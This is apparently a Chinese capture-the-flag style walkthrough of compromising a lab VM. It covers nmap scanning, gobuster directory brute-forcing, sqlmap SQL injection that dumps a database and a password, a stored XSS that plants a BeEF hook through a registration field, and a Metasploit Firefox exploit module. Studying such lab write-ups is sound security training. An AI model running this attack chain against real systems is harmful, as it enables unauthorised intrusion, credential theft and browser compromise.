## **1、信息收集**

### **1.1配置静态IP**

由于虚拟机配置的IP地址为静态IP，需要把攻击机配置在同网段

![](../Images/3bbc19093f669c197020fbf72a56f10f.png)

### **1.2 通过nmap进行端口扫描**

```
nmap -A -sS -sV -v -p- 192.168.110.151
```

查看开放了三个的端口

![](../Images/99d3b929557334b0fe581d2edb1fde28.png)

## **2、渗透测试**

### **2.1 服务渗透**

#### **1.访问SSH服务**

```
ssh 192.168.110.151 -p 65525
```

提示有账号Peter，密码在源码中

![](../Images/7dd9cadb6ea5e9a75ff3d4a4548ded93.png)

把字符串组合成inthesource作为密码，并通过账号peter登录，会直接断开

```
ssh peter@192.168.110.151 -p 65535
```

![](../Images/b1a797ea04648640fa8a0ba4b077672f.png)

重新扫描端口，发现80端口已经打开

![](../Images/3ad0d567da6c7d77511c2fbcf3de591f.png)

### **2.2 WEB渗透**

#### **1.站点信息收集**

可以正常访问http服务

![](../Images/2775cc0f1f8896fb6ccc6581456248ec.png)

使用gobuster爆破目录，发现有blog目录

```
gobuster dir -u http://192.168.110.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt
```

![](../Images/077d515157e4b47c480f0d5035fbfbb0.png)

#### **2.博客站点测试**

访问blog目录发现为博客站点

![](../Images/d029f4a63df7d787642936dad9e4a9f4.png)

使用sqlmap进行自动爬取和测试，提示search参数有注入漏洞

```
sqlmap --forms --batch --crawl 4 -u http://192.168.110.151/blog/index.php
```

![](../Images/57d3072330af98c03b89a15e1ae32860.png)

![](../Images/4ee75648cb94c5635c9a5540441deb94.png)

#### **3.SQLMap爆破**

爆破当前数据库存在的数据库内容

```
sqlmap -u "http://192.168.110.151/blog/index.php?search="  -dbs
```

![](../Images/036e88c5b1ba28624120f909aff118c5.png)

```
sqlmap -u "http://192.168.110.151/blog/index.php?search="  -dbs -D oscommerce  -tables -dump
```

![](../Images/71b9be65deebd9d13d0b1b552ebb2c2e.png)

爆破密码为32admin,但是未找到网站后台

![](../Images/ea3f00adbbcdc9f7c97e096d16a2e209.png)

#### **4.使用XSS渗透**

查找该博客的相关漏洞，提示同时存在XSS漏洞，并且根据SSH Banner提示perter会频繁访问站点

```
searchsploit blogphp
```

![](../Images/9cd1eb21be35ba1fd50651e4b9dfe03a.png)

漏洞点在用户注册页面处，使用Beef创建XSS平台

```

apt install beef-xss
```

![](../Images/a84cbe1a1be5319d4e93bd14d4ac4b02.png)

使用Beef生成的Hook脚本填入到用户名位置

![](../Images/fbb9eee6d6dd21eeb9c8d9843ec5a1cb.png)

等待一会儿发现存在用户上线，发现火狐浏览器版本为15.0存在漏洞

![](../Images/adca3449f7ea107988298a87cca3deb3.png)

```


use exploit/multi/browser/firefox\_proto\_crmfrequest
```

![](../Images/435793df4047be5b0c0865cd1c11360b.png)
